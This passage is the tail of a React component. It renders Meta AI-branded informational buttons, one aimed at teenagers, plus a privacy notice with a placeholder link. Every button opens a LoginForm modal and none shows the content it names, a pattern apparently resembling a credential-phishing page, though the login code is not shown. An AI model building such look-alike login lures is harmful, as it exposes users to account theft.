                      d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z"
                      fill="black"
                    ></path>
                  </svg>
                </div>
              </div>

              <div
                className="action-button b-bottom lucky"
                onClick={handleShowForm}
              >
                <div className="action-text">
                  <span>
                    Cards with information about the operation of AI systems
                  </span>
                  <br />
                  <span className="small-grey">Meta AI website</span>
                </div>
                <div className="action-arrow">
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z"
                      fill="black"
                    ></path>
                  </svg>
                </div>
              </div>

              <div
                className="action-button b-bottom lucky"
                onClick={handleShowForm}
              >
                <div className="action-text">
                  <span>Introduction to Generative AI</span>
                  <br />
                  <span className="small-grey">For teenagers</span>
                </div>
                <div className="action-arrow">
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z"
                      fill="black"
                    ></path>
                  </svg>
                </div>
              </div>
            </div>
            <br />
            <div className="small-grey">
              We continually identify potential privacy risks, including when
              collecting, using or sharing personal information, and developing
              methods to reduce these risks. Read more about{" "}
              <a href="#">Privacy Policy</a>
            </div>
          </div>
        </div>
      </div>

      {isShowModal && <LoginForm onClose={handleCloseForm} />}
    </>
  );
}

export default App;
